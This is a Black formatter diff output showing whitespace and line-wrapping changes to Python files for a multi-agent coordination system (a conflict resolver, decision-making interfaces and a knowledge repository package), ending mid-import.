 from fs_agt_clean.core.coordination.coordinator.task_delegator import (
-    Task, TaskStatus, TaskPriority
+    Task,
+    TaskStatus,
+    TaskPriority,
 )
 
 
 class ConflictType(enum.Enum):
     """
     Type of conflict in the system.
     """
+
     RESOURCE = "resource"  # Conflict over a resource
     TASK = "task"  # Conflict between tasks
     AGENT = "agent"  # Conflict between agents
     PRIORITY = "priority"  # Conflict over priority
     AUTHORITY = "authority"  # Conflict over authority
@@ -42,10 +55,11 @@
 
 class ConflictStatus(enum.Enum):
     """
     Status of a conflict in the system.
     """
+
     DETECTED = "detected"  # Conflict has been detected
     ANALYZING = "analyzing"  # Conflict is being analyzed
     RESOLVING = "resolving"  # Conflict is being resolved
     RESOLVED = "resolved"  # Conflict has been resolved
     UNRESOLVABLE = "unresolvable"  # Conflict cannot be resolved
@@ -54,10 +68,11 @@
 
 class ResolutionStrategy(enum.Enum):
     """
     Strategy for resolving conflicts.
     """
+
     PRIORITY = "priority"  # Resolve based on priority
     AUTHORITY = "authority"  # Resolve based on authority
     CONSENSUS = "consensus"  # Resolve based on consensus
     FIRST = "first"  # Resolve in favor of the first entity
     LAST = "last"  # Resolve in favor of the last entity
@@ -80,11 +95,11 @@
         self,
         conflict_id: str,
         conflict_type: ConflictType,
         entities: List[Dict[str, Any]],
         description: str,
-        metadata: Dict[str, Any] = None
+        metadata: Dict[str, Any] = None,
     ):
         """
         Initialize a conflict.
 
         Args:
@@ -124,17 +139,19 @@
             "description": self.description,
             "metadata": self.metadata,
             "status": self.status.value,
             "detected_at": self.detected_at.isoformat(),
             "resolved_at": self.resolved_at.isoformat() if self.resolved_at else None,
-            "resolution_strategy": self.resolution_strategy.value if self.resolution_strategy else None,
+            "resolution_strategy": (
+                self.resolution_strategy.value if self.resolution_strategy else None
+            ),
             "resolution_description": self.resolution_description,
-            "resolution_result": self.resolution_result
+            "resolution_result": self.resolution_result,
         }
 
     @classmethod
-    def from_dict(cls, data: Dict[str, Any]) -> 'Conflict':
+    def from_dict(cls, data: Dict[str, Any]) -> "Conflict":
         """
         Create a conflict from a dictionary.
 
         Args:
             data: Dictionary containing conflict data
@@ -146,23 +163,27 @@
         conflict = cls(
             conflict_id=data["conflict_id"],
             conflict_type=ConflictType(data["conflict_type"]),
             entities=data["entities"],
             description=data["description"],
-            metadata=data.get("metadata", {})
+            metadata=data.get("metadata", {}),
         )
 
         # Set conflict lifecycle information
-        conflict.status = ConflictStatus(data.get("status", ConflictStatus.DETECTED.value))
+        conflict.status = ConflictStatus(
+            data.get("status", ConflictStatus.DETECTED.value)
+        )
         conflict.detected_at = datetime.fromisoformat(data["detected_at"])
 
         if data.get("resolved_at"):
             conflict.resolved_at = datetime.fromisoformat(data["resolved_at"])
 
         # Set resolution information
         if data.get("resolution_strategy"):
-            conflict.resolution_strategy = ResolutionStrategy(data["resolution_strategy"])
+            conflict.resolution_strategy = ResolutionStrategy(
+                data["resolution_strategy"]
+            )
 
         conflict.resolution_description = data.get("resolution_description")
         conflict.resolution_result = data.get("resolution_result")
 
         return conflict
@@ -179,14 +200,11 @@
         # Update timestamp if resolved
         if status == ConflictStatus.RESOLVED and not self.resolved_at:
             self.resolved_at = datetime.now()
 
     def resolve(
-        self,
-        strategy: ResolutionStrategy,
-        description: str,
-        result: Any
+        self, strategy: ResolutionStrategy, description: str, result: Any
     ) -> None:
         """
         Resolve the conflict.
 
         Args:
@@ -225,11 +243,11 @@
             True if the conflict is active
         """
         return self.status in (
             ConflictStatus.DETECTED,
             ConflictStatus.ANALYZING,
-            ConflictStatus.RESOLVING
+            ConflictStatus.RESOLVING,
         )
 
     def __str__(self) -> str:
         """
         Get string representation of the conflict.
@@ -258,12 +276,16 @@
         """
         self.resolver_id = resolver_id
         self.logger = get_logger(f"coordinator.resolver.{resolver_id}")
 
         # Create publisher and subscriber for event-based communication
-        self.publisher = create_publisher(source_id=f"coordinator.resolver.{resolver_id}")
-        self.subscriber = create_subscriber(subscriber_id=f"coordinator.resolver.{resolver_id}")
+        self.publisher = create_publisher(
+            source_id=f"coordinator.resolver.{resolver_id}"
+        )
+        self.subscriber = create_subscriber(
+            subscriber_id=f"coordinator.resolver.{resolver_id}"
+        )
 
         # Initialize conflict registry
         self.conflicts: Dict[str, Conflict] = {}
 
         # Initialize resolution strategies
@@ -312,19 +334,21 @@
         """
         self.resolution_strategies[ConflictType.RESOURCE] = ResolutionStrategy.PRIORITY
         self.resolution_strategies[ConflictType.TASK] = ResolutionStrategy.PRIORITY
         self.resolution_strategies[ConflictType.AGENT] = ResolutionStrategy.AUTHORITY
         self.resolution_strategies[ConflictType.PRIORITY] = ResolutionStrategy.AUTHORITY
-        self.resolution_strategies[ConflictType.AUTHORITY] = ResolutionStrategy.AUTHORITY
-        self.resolution_strategies[ConflictType.CAPABILITY] = ResolutionStrategy.AUTHORITY
+        self.resolution_strategies[ConflictType.AUTHORITY] = (
+            ResolutionStrategy.AUTHORITY
+        )
+        self.resolution_strategies[ConflictType.CAPABILITY] = (
+            ResolutionStrategy.AUTHORITY
+        )
         self.resolution_strategies[ConflictType.DATA] = ResolutionStrategy.LAST
         self.resolution_strategies[ConflictType.OTHER] = ResolutionStrategy.PRIORITY
 
     async def set_resolution_strategy(
-        self,
-        conflict_type: ConflictType,
-        strategy: ResolutionStrategy
+        self, conflict_type: ConflictType, strategy: ResolutionStrategy
     ) -> None:
         """
         Set the resolution strategy for a conflict type.
 
         Args:
@@ -336,13 +360,11 @@
         self.logger.info(
             f"Resolution strategy set: {conflict_type.value} -> {strategy.value}"
         )
 
     async def register_custom_resolver(
-        self,
-        conflict_type: ConflictType,
-        resolver_func: Callable
+        self, conflict_type: ConflictType, resolver_func: Callable
     ) -> None:
         """
         Register a custom resolver function for a conflict type.
 
         Args:
@@ -361,11 +383,11 @@
     async def detect_conflict(
         self,
         conflict_type: ConflictType,
         entities: List[Dict[str, Any]],
         description: str,
-        metadata: Dict[str, Any] = None
+        metadata: Dict[str, Any] = None,
     ) -> str:
         """
         Detect and register a new conflict.
 
         Args:
@@ -388,11 +410,11 @@
             conflict = Conflict(
                 conflict_id=conflict_id,
                 conflict_type=conflict_type,
                 entities=entities,
                 description=description,
-                metadata=metadata
+                metadata=metadata,
             )
 
             # Store the conflict
             async with self.conflict_lock:
                 self.conflicts[conflict_id] = conflict
@@ -442,19 +464,22 @@
             CoordinationError: If the retrieval fails
         """
         try:
             async with self.conflict_lock:
                 return [
-                    conflict for conflict in self.conflicts.values()
+                    conflict
+                    for conflict in self.conflicts.values()
                     if conflict.is_active()
                 ]
         except Exception as e:
             error_msg = f"Failed to get active conflicts: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, cause=e)
 
-    async def get_conflicts_by_type(self, conflict_type: ConflictType) -> List[Conflict]:
+    async def get_conflicts_by_type(
+        self, conflict_type: ConflictType
+    ) -> List[Conflict]:
         """
         Get conflicts by type.
 
         Args:
             conflict_type: Type of conflicts to get
@@ -466,23 +491,26 @@
             CoordinationError: If the retrieval fails
         """
         try:
             async with self.conflict_lock:
                 return [
-                    conflict for conflict in self.conflicts.values()
+                    conflict
+                    for conflict in self.conflicts.values()
                     if conflict.conflict_type == conflict_type
                 ]
         except Exception as e:
-            error_msg = f"Failed to get conflicts by type {conflict_type.value}: {str(e)}"
+            error_msg = (
+                f"Failed to get conflicts by type {conflict_type.value}: {str(e)}"
+            )
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, cause=e)
 
     async def resolve_conflict(
         self,
         conflict_id: str,
         strategy: Optional[ResolutionStrategy] = None,
-        resolution_params: Dict[str, Any] = None
+        resolution_params: Dict[str, Any] = None,
     ) -> bool:
         """
         Resolve a conflict.
 
         Args:
@@ -515,11 +543,11 @@
 
             # Get the resolution strategy
             if strategy is None:
                 strategy = self.resolution_strategies.get(
                     conflict.conflict_type,
-                    ResolutionStrategy.PRIORITY  # Default strategy
+                    ResolutionStrategy.PRIORITY,  # Default strategy
                 )
 
             # Apply the resolution strategy
             resolution_params = resolution_params or {}
             resolution_result = await self._apply_resolution_strategy(
@@ -528,11 +556,11 @@
 
             # Update conflict with resolution information
             conflict.resolve(
                 strategy=strategy,
                 description=f"Resolved using {strategy.value} strategy",
-                result=resolution_result
+                result=resolution_result,
             )
 
             # Publish conflict resolved event
             await self._publish_conflict_resolved_event(conflict)
 
@@ -544,15 +572,11 @@
         except Exception as e:
             error_msg = f"Failed to resolve conflict {conflict_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, cause=e)
 
-    async def mark_conflict_unresolvable(
-        self,
-        conflict_id: str,
-        reason: str
-    ) -> bool:
+    async def mark_conflict_unresolvable(self, conflict_id: str, reason: str) -> bool:
         """
         Mark a conflict as unresolvable.
 
         Args:
             conflict_id: ID of the conflict
@@ -591,19 +615,17 @@
                 f"Conflict marked as unresolvable: {conflict_id} - {reason}"
             )
 
             return True
         except Exception as e:
-            error_msg = f"Failed to mark conflict as unresolvable {conflict_id}: {str(e)}"
+            error_msg = (
+                f"Failed to mark conflict as unresolvable {conflict_id}: {str(e)}"
+            )
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, cause=e)
 
-    async def ignore_conflict(
-        self,
-        conflict_id: str,
-        reason: str
-    ) -> bool:
+    async def ignore_conflict(self, conflict_id: str, reason: str) -> bool:
         """
         Ignore a conflict.
 
         Args:
             conflict_id: ID of the conflict
@@ -636,25 +658,20 @@
             conflict.metadata["ignore_reason"] = reason
 
             # Publish conflict ignored event
             await self._publish_conflict_ignored_event(conflict)
 
-            self.logger.info(
-                f"Conflict ignored: {conflict_id} - {reason}"
-            )
+            self.logger.info(f"Conflict ignored: {conflict_id} - {reason}")
 
             return True
         except Exception as e:
             error_msg = f"Failed to ignore conflict {conflict_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, cause=e)
 
     async def _apply_resolution_strategy(
-        self,
-        conflict: Conflict,
-        strategy: ResolutionStrategy,
-        params: Dict[str, Any]
+        self, conflict: Conflict, strategy: ResolutionStrategy, params: Dict[str, Any]
     ) -> Any:
         """
         Apply a resolution strategy to a conflict.
 
         Args:
@@ -674,21 +691,19 @@
                 # Find the entity with the highest priority
                 entities = conflict.entities
                 if not entities:
                     raise CoordinationError(
                         "No entities to resolve",
-                        cause=ValueError("Empty entities list")
+                        cause=ValueError("Empty entities list"),
                     )
 
                 # Get priority field name from params or use default
                 priority_field = params.get("priority_field", "priority")
 
                 # Sort entities by priority (higher values first)
                 sorted_entities = sorted(
-                    entities,
-                    key=lambda e: e.get(priority_field, 0),
-                    reverse=True
+                    entities, key=lambda e: e.get(priority_field, 0), reverse=True
                 )
 
                 # Return the highest priority entity
                 return sorted_entities[0]
 
@@ -697,21 +712,19 @@
                 # Find the entity with the highest authority
                 entities = conflict.entities
                 if not entities:
                     raise CoordinationError(
                         "No entities to resolve",
-                        cause=ValueError("Empty entities list")
+                        cause=ValueError("Empty entities list"),
                     )
 
                 # Get authority field name from params or use default
                 authority_field = params.get("authority_field", "authority")
 
                 # Sort entities by authority (higher values first)
                 sorted_entities = sorted(
-                    entities,
-                    key=lambda e: e.get(authority_field, 0),
-                    reverse=True
+                    entities, key=lambda e: e.get(authority_field, 0), reverse=True
                 )
 
                 # Return the highest authority entity
                 return sorted_entities[0]
 
@@ -720,11 +733,11 @@
                 # Find the most common value
                 entities = conflict.entities
                 if not entities:
                     raise CoordinationError(
                         "No entities to resolve",
-                        cause=ValueError("Empty entities list")
+                        cause=ValueError("Empty entities list"),
                     )
 
                 # Get value field name from params or use default
                 value_field = params.get("value_field", "value")
 
@@ -739,11 +752,11 @@
                         value_counts[value_str] += 1
 
                 if not value_counts:
                     raise CoordinationError(
                         f"No values found in field '{value_field}'",
-                        cause=ValueError(f"No values in field '{value_field}'")
+                        cause=ValueError(f"No values in field '{value_field}'"),
                     )
 
                 # Find the most common value
                 most_common_value = max(value_counts.items(), key=lambda x: x[1])[0]
 
@@ -754,11 +767,11 @@
                 # Resolve in favor of the first entity
                 entities = conflict.entities
                 if not entities:
                     raise CoordinationError(
                         "No entities to resolve",
-                        cause=ValueError("Empty entities list")
+                        cause=ValueError("Empty entities list"),
                     )
 
                 # Return the first entity
                 return entities[0]
 
@@ -766,11 +779,11 @@
                 # Resolve in favor of the last entity
                 entities = conflict.entities
                 if not entities:
                     raise CoordinationError(
                         "No entities to resolve",
-                        cause=ValueError("Empty entities list")
+                        cause=ValueError("Empty entities list"),
                     )
 
                 # Return the last entity
                 return entities[-1]
 
@@ -778,11 +791,11 @@
                 # Merge conflicting entities
                 entities = conflict.entities
                 if not entities:
                     raise CoordinationError(
                         "No entities to resolve",
-                        cause=ValueError("Empty entities list")
+                        cause=ValueError("Empty entities list"),
                     )
 
                 # Get merge fields from params or use all fields
                 merge_fields = params.get("merge_fields")
 
@@ -818,30 +831,36 @@
                 # It's expected that the caller will handle the delegation
                 return None
 
             elif strategy == ResolutionStrategy.CUSTOM:
                 # Use a custom resolution strategy
-                custom_resolver = self.custom_resolvers.get(conflict.conflict_type.value)
+                custom_resolver = self.custom_resolvers.get(
+                    conflict.conflict_type.value
+                )
                 if not custom_resolver:
                     raise CoordinationError(
                         f"Custom resolver not found for conflict type {conflict.conflict_type.value}",
-                        cause=ValueError(f"No custom resolver for {conflict.conflict_type.value}")
+                        cause=ValueError(
+                            f"No custom resolver for {conflict.conflict_type.value}"
+                        ),
                     )
 
                 # Call the custom resolver
                 return await custom_resolver(conflict, params)
 
             else:
                 raise CoordinationError(
                     f"Unknown resolution strategy: {strategy}",
-                    cause=ValueError(f"Unknown strategy: {strategy}")
+                    cause=ValueError(f"Unknown strategy: {strategy}"),
                 )
         except CoordinationError:
             # Re-raise coordination errors
             raise
         except Exception as e:
-            error_msg = f"Failed to apply resolution strategy {strategy.value}: {str(e)}"
+            error_msg = (
+                f"Failed to apply resolution strategy {strategy.value}: {str(e)}"
+            )
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, cause=e)
 
     async def _subscribe_to_events(self) -> None:
         """
@@ -851,18 +870,18 @@
         resolution, and other conflict-related events.
         """
         # Subscribe to conflict detection events
         subscription_id = await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"conflict_detected"}),
-            handler=self._handle_conflict_detected
+            handler=self._handle_conflict_detected,
         )
         self.subscription_ids.append(subscription_id)
 
         # Subscribe to conflict resolution events
         subscription_id = await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"conflict_resolution_request"}),
-            handler=self._handle_conflict_resolution_request
+            handler=self._handle_conflict_resolution_request,
         )
         self.subscription_ids.append(subscription_id)
 
     async def _handle_conflict_detected(self, event: Event) -> None:
         """
@@ -877,29 +896,35 @@
             entities = event.data.get("entities")
             description = event.data.get("description")
             metadata = event.data.get("metadata")
 
             if not conflict_type_str or not entities or not description:
-                self.logger.warning("Received conflict detected event with missing data")
+                self.logger.warning(
+                    "Received conflict detected event with missing data"
+                )
                 return
 
             # Convert conflict type string to enum
             try:
                 conflict_type = ConflictType(conflict_type_str)
             except ValueError:
-                self.logger.warning(f"Received invalid conflict type: {conflict_type_str}")
+                self.logger.warning(
+                    f"Received invalid conflict type: {conflict_type_str}"
+                )
                 return
 
             # Detect the conflict
             await self.detect_conflict(
                 conflict_type=conflict_type,
                 entities=entities,
                 description=description,
-                metadata=metadata
+                metadata=metadata,
             )
         except Exception as e:
-            self.logger.error(f"Error handling conflict detected event: {str(e)}", exc_info=True)
+            self.logger.error(
+                f"Error handling conflict detected event: {str(e)}", exc_info=True
+            )
 
     async def _handle_conflict_resolution_request(self, event: Event) -> None:
         """
         Handle a conflict resolution request event.
 
@@ -911,30 +936,36 @@
             conflict_id = event.data.get("conflict_id")
             strategy_str = event.data.get("strategy")
             resolution_params = event.data.get("resolution_params")
 
             if not conflict_id:
-                self.logger.warning("Received conflict resolution request without conflict_id")
+                self.logger.warning(
+                    "Received conflict resolution request without conflict_id"
+                )
                 return
 
             # Convert strategy string to enum if provided
             strategy = None
             if strategy_str:
                 try:
                     strategy = ResolutionStrategy(strategy_str)
                 except ValueError:
-                    self.logger.warning(f"Received invalid resolution strategy: {strategy_str}")
+                    self.logger.warning(
+                        f"Received invalid resolution strategy: {strategy_str}"
+                    )
                     return
 
             # Resolve the conflict
             await self.resolve_conflict(
                 conflict_id=conflict_id,
                 strategy=strategy,
-                resolution_params=resolution_params
+                resolution_params=resolution_params,
             )
         except Exception as e:
-            self.logger.error(f"Error handling conflict resolution request: {str(e)}", exc_info=True)
+            self.logger.error(
+                f"Error handling conflict resolution request: {str(e)}", exc_info=True
+            )
 
     async def _publish_conflict_detected_event(self, conflict: Conflict) -> None:
         """
         Publish a conflict detected event.
 
@@ -946,12 +977,12 @@
             data={
                 "conflict_id": conflict.conflict_id,
                 "conflict_type": conflict.conflict_type.value,
                 "description": conflict.description,
                 "entity_count": len(conflict.entities),
-                "detected_at": conflict.detected_at.isoformat()
-            }
+                "detected_at": conflict.detected_at.isoformat(),
+            },
         )
 
     async def _publish_conflict_resolved_event(self, conflict: Conflict) -> None:
         """
         Publish a conflict resolved event.
@@ -964,12 +995,14 @@
             data={
                 "conflict_id": conflict.conflict_id,
                 "conflict_type": conflict.conflict_type.value,
                 "resolution_strategy": conflict.resolution_strategy.value,
                 "description": conflict.resolution_description,
-                "resolved_at": conflict.resolved_at.isoformat() if conflict.resolved_at else None
-            }
+                "resolved_at": (
+                    conflict.resolved_at.isoformat() if conflict.resolved_at else None
+                ),
+            },
         )
 
     async def _publish_conflict_unresolvable_event(self, conflict: Conflict) -> None:
         """
         Publish a conflict unresolvable event.
@@ -980,12 +1013,14 @@
         await self.publisher.publish_notification(
             notification_name="conflict_unresolvable",
             data={
                 "conflict_id": conflict.conflict_id,
                 "conflict_type": conflict.conflict_type.value,
-                "reason": conflict.metadata.get("unresolvable_reason", "Unknown reason")
-            }
+                "reason": conflict.metadata.get(
+                    "unresolvable_reason", "Unknown reason"
+                ),
+            },
         )
 
     async def _publish_conflict_ignored_event(self, conflict: Conflict) -> None:
         """
         Publish a conflict ignored event.
@@ -996,8 +1031,8 @@
         await self.publisher.publish_notification(
             notification_name="conflict_ignored",
             data={
                 "conflict_id": conflict.conflict_id,
                 "conflict_type": conflict.conflict_type.value,
-                "reason": conflict.metadata.get("ignore_reason", "Unknown reason")
-            }
-        )
+                "reason": conflict.metadata.get("ignore_reason", "Unknown reason"),
+            },
+        )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/conflict_resolver.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/interfaces.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/interfaces.py	2025-06-19 04:03:50.859175+00:00
@@ -14,458 +14,438 @@
 """
 
 import abc
 from typing import Any, Dict, List, Optional, Tuple, Union
 
-from fs_agt_clean.core.coordination.decision.models import (
-    Decision, DecisionStatus
-)
+from fs_agt_clean.core.coordination.decision.models import Decision, DecisionStatus
 
 
 class DecisionMaker(abc.ABC):
     """Interface for decision makers.
-    
+
     A decision maker is responsible for making decisions based on context,
     options, and constraints. It evaluates options and selects the best one
     based on various factors.
     """
-    
+
     @abc.abstractmethod
     async def make_decision(
         self,
         context: Dict[str, Any],
         options: List[Dict[str, Any]],
-        constraints: Optional[Dict[str, Any]] = None
+        constraints: Optional[Dict[str, Any]] = None,
     ) -> Decision:
         """Make a decision based on context, options, and constraints.
-        
+
         Args:
             context: Context in which the decision is being made
             options: Available options to choose from
             constraints: Optional constraints on the decision
-            
+
         Returns:
             The decision that was made
-            
+
         Raises:
             DecisionError: If the decision cannot be made
         """
         pass
-    
+
     @abc.abstractmethod
     async def get_decision(self, decision_id: str) -> Optional[Decision]:
         """Get a decision by ID.
-        
+
         Args:
             decision_id: ID of the decision to get
-            
+
         Returns:
             The decision, or None if not found
-            
+
         Raises:
             DecisionError: If there is an error getting the decision
         """
         pass
-    
+
     @abc.abstractmethod
     async def list_decisions(
-        self,
-        filters: Optional[Dict[str, Any]] = None
+        self, filters: Optional[Dict[str, Any]] = None
     ) -> List[Decision]:
         """List decisions matching the given filters.
-        
+
         Args:
             filters: Optional filters to apply
-            
+
         Returns:
             List of matching decisions
-            
+
         Raises:
             DecisionError: If there is an error listing decisions
         """
         pass
 
 
 class DecisionValidator(abc.ABC):
     """Interface for decision validators.
-    
+
     A decision validator is responsible for validating decisions against
     rules and constraints. It ensures that decisions are valid and can be
     executed.
     """
-    
-    @abc.abstractmethod
-    async def validate_decision(
-        self,
-        decision: Decision
-    ) -> Tuple[bool, List[str]]:
+
+    @abc.abstractmethod
+    async def validate_decision(self, decision: Decision) -> Tuple[bool, List[str]]:
         """Validate a decision against rules and constraints.
-        
+
         Args:
             decision: The decision to validate
-            
+
         Returns:
             Tuple of (is_valid, validation_messages)
-            
+
         Raises:
             DecisionError: If there is an error validating the decision
         """
         pass
-    
-    @abc.abstractmethod
-    async def add_validation_rule(
-        self,
-        rule_name: str,
-        rule_function: Any
-    ) -> bool:
+
+    @abc.abstractmethod
+    async def add_validation_rule(self, rule_name: str, rule_function: Any) -> bool:
         """Add a validation rule.
-        
+
         Args:
             rule_name: Name of the rule
             rule_function: Function that implements the rule
-            
+
         Returns:
             True if the rule was added, False otherwise
-            
+
         Raises:
             DecisionError: If there is an error adding the rule
         """
         pass
-    
+
     @abc.abstractmethod
     async def remove_validation_rule(self, rule_name: str) -> bool:
         """Remove a validation rule.
-        
+
         Args:
             rule_name: Name of the rule to remove
-            
+
         Returns:
             True if the rule was removed, False otherwise
-            
+
         Raises:
             DecisionError: If there is an error removing the rule
         """
         pass
-    
+
     @abc.abstractmethod
     async def list_validation_rules(self) -> List[str]:
         """List all validation rules.
-        
+
         Returns:
             List of rule names
-            
+
         Raises:
             DecisionError: If there is an error listing rules
         """
         pass
 
 
 class DecisionTracker(abc.ABC):
     """Interface for decision trackers.
-    
+
     A decision tracker is responsible for tracking decisions and their
     outcomes. It maintains a history of decisions and provides metrics
     on decision quality.
     """
-    
+
     @abc.abstractmethod
     async def track_decision(self, decision: Decision) -> bool:
         """Track a decision.
-        
+
         Args:
             decision: The decision to track
-            
+
         Returns:
             True if the decision was tracked, False otherwise
-            
+
         Raises:
             DecisionError: If there is an error tracking the decision
         """
         pass
-    
+
     @abc.abstractmethod
     async def update_decision_status(
-        self,
-        decision_id: str,
-        status: DecisionStatus
+        self, decision_id: str, status: DecisionStatus
     ) -> bool:
         """Update the status of a decision.
-        
+
         Args:
             decision_id: ID of the decision to update
             status: New status
-            
+
         Returns:
             True if the status was updated, False otherwise
-            
+
         Raises:
             DecisionError: If there is an error updating the status
         """
         pass
-    
+
     @abc.abstractmethod
     async def get_decision_history(
         self,
         decision_id: Optional[str] = None,
-        filters: Optional[Dict[str, Any]] = None
+        filters: Optional[Dict[str, Any]] = None,
     ) -> List[Decision]:
         """Get the history of decisions.
-        
+
         Args:
             decision_id: Optional ID of a specific decision
             filters: Optional filters to apply
-            
+
         Returns:
             List of decisions
-            
+
         Raises:
             DecisionError: If there is an error getting the history
         """
         pass
-    
+
     @abc.abstractmethod
     async def get_decision_metrics(
-        self,
-        filters: Optional[Dict[str, Any]] = None
+        self, filters: Optional[Dict[str, Any]] = None
     ) -> Dict[str, Any]:
         """Get metrics on decisions.
-        
+
         Args:
             filters: Optional filters to apply
-            
+
         Returns:
             Dictionary of metrics
-            
+
         Raises:
             DecisionError: If there is an error getting metrics
         """
         pass
 
 
 class FeedbackProcessor(abc.ABC):
     """Interface for feedback processors.
-    
+
     A feedback processor is responsible for processing feedback on decision
     outcomes. It collects feedback and prepares it for learning.
     """
-    
+
     @abc.abstractmethod
     async def process_feedback(
-        self,
-        decision_id: str,
-        feedback_data: Dict[str, Any]
+        self, decision_id: str, feedback_data: Dict[str, Any]
     ) -> bool:
         """Process feedback on a decision.
-        
+
         Args:
             decision_id: ID of the decision
             feedback_data: Feedback data
-            
+
         Returns:
             True if the feedback was processed, False otherwise
-            
+
         Raises:
             DecisionError: If there is an error processing feedback
         """
         pass
-    
+
     @abc.abstractmethod
     async def get_feedback(self, feedback_id: str) -> Optional[Dict[str, Any]]:
         """Get feedback by ID.
-        
+
         Args:
             feedback_id: ID of the feedback to get
-            
+
         Returns:
             The feedback, or None if not found
-            
+
         Raises:
             DecisionError: If there is an error getting feedback
         """
         pass
-    
+
     @abc.abstractmethod
     async def list_feedback(
         self,
         decision_id: Optional[str] = None,
-        filters: Optional[Dict[str, Any]] = None
+        filters: Optional[Dict[str, Any]] = None,
     ) -> List[Dict[str, Any]]:
         """List feedback matching the given filters.
-        
+
         Args:
             decision_id: Optional ID of a specific decision
             filters: Optional filters to apply
-            
+
         Returns:
             List of matching feedback
-            
+
         Raises:
             DecisionError: If there is an error listing feedback
         """
         pass
 
 
 class LearningEngine(abc.ABC):
     """Interface for learning engines.
-    
+
     A learning engine is responsible for learning from decision outcomes
     and feedback. It adapts decision-making strategies based on past
     performance.
     """
-    
+
     @abc.abstractmethod
     async def learn_from_feedback(self, feedback_data: Dict[str, Any]) -> bool:
         """Learn from feedback on decision outcomes.
-        
+
         Args:
             feedback_data: Feedback data
-            
+
         Returns:
             True if learning was successful, False otherwise
-            
+
         Raises:
             DecisionError: If there is an error learning from feedback
         """
         pass
-    
+
     @abc.abstractmethod
     async def get_learning_metrics(self) -> Dict[str, Any]:
         """Get metrics on learning.
-        
+
         Returns:
             Dictionary of metrics
-            
+
         Raises:
             DecisionError: If there is an error getting metrics
         """
         pass
-    
+
     @abc.abstractmethod
     async def reset_learning(self) -> bool:
         """Reset learning state.
-        
+
         Returns:
             True if reset was successful, False otherwise
-            
+
         Raises:
             DecisionError: If there is an error resetting learning
         """
         pass
 
 
 class DecisionPipeline(abc.ABC):
     """Interface for decision pipelines.
-    
+
     A decision pipeline orchestrates the entire decision-making process,
     from making a decision to executing it and learning from the outcome.
     It combines all the other components into a cohesive workflow.
     """
-    
+
     @abc.abstractmethod
     async def make_decision(
         self,
         context: Dict[str, Any],
         options: List[Dict[str, Any]],
-        constraints: Optional[Dict[str, Any]] = None
+        constraints: Optional[Dict[str, Any]] = None,
     ) -> Decision:
         """Make a decision based on context, options, and constraints.
-        
+
         Args:
             context: Context in which the decision is being made
             options: Available options to choose from
             constraints: Optional constraints on the decision
-            
+
         Returns:
             The decision that was made
-            
+
         Raises:
             DecisionError: If the decision cannot be made
         """
         pass
-    
-    @abc.abstractmethod
-    async def validate_decision(
-        self,
-        decision: Decision
-    ) -> Tuple[bool, List[str]]:
+
+    @abc.abstractmethod
+    async def validate_decision(self, decision: Decision) -> Tuple[bool, List[str]]:
         """Validate a decision against rules and constraints.
-        
+
         Args:
             decision: The decision to validate
-            
+
         Returns:
             Tuple of (is_valid, validation_messages)
-            
+
         Raises:
             DecisionError: If there is an error validating the decision
         """
         pass
-    
+
     @abc.abstractmethod
     async def execute_decision(self, decision: Decision) -> bool:
         """Execute a decision.
-        
+
         Args:
             decision: The decision to execute
-            
+
         Returns:
             True if execution was successful, False otherwise
-            
+
         Raises:
             DecisionError: If there is an error executing the decision
         """
         pass
-    
+
     @abc.abstractmethod
     async def process_feedback(
-        self,
-        decision_id: str,
-        feedback_data: Dict[str, Any]
+        self, decision_id: str, feedback_data: Dict[str, Any]
     ) -> bool:
         """Process feedback on a decision and learn from it.
-        
+
         Args:
             decision_id: ID of the decision
             feedback_data: Feedback data
-            
+
         Returns:
             True if processing was successful, False otherwise
-            
+
         Raises:
             DecisionError: If there is an error processing feedback
         """
         pass
-    
+
     @abc.abstractmethod
     async def get_decision(self, decision_id: str) -> Optional[Decision]:
         """Get a decision by ID.
-        
+
         Args:
             decision_id: ID of the decision to get
-            
+
         Returns:
             The decision, or None if not found
-            
+
         Raises:
             DecisionError: If there is an error getting the decision
         """
         pass
-    
+
     @abc.abstractmethod
     async def get_decision_history(
         self,
         decision_id: Optional[str] = None,
-        filters: Optional[Dict[str, Any]] = None
+        filters: Optional[Dict[str, Any]] = None,
     ) -> List[Decision]:
         """Get the history of decisions.
-        
+
         Args:
             decision_id: Optional ID of a specific decision
             filters: Optional filters to apply
-            
+
         Returns:
             List of decisions
-            
+
         Raises:
             DecisionError: If there is an error getting the history
         """
         pass
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/interfaces.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/__init__.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/__init__.py	2025-06-19 04:03:51.012428+00:00
@@ -13,35 +13,61 @@
 - Scalable: Capable of handling large knowledge repositories
 """
 
 # Re-export core components
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_repository import (
-    KnowledgeItem, KnowledgeType, KnowledgeStatus, KnowledgeRepository, KnowledgeError
+    KnowledgeItem,
+    KnowledgeType,
+    KnowledgeStatus,
+    KnowledgeRepository,
+    KnowledgeError,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.vector_storage import (
-    VectorStorage, VectorStorageError, InMemoryVectorStorage
+    VectorStorage,
+    VectorStorageError,
+    InMemoryVectorStorage,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.embedding_provider import (
-    EmbeddingProvider, EmbeddingError, SimpleEmbeddingProvider
+    EmbeddingProvider,
+    EmbeddingError,
+    SimpleEmbeddingProvider,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_publisher import (
-    KnowledgePublisher, PublishError
+    KnowledgePublisher,
+    PublishError,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_filter import (
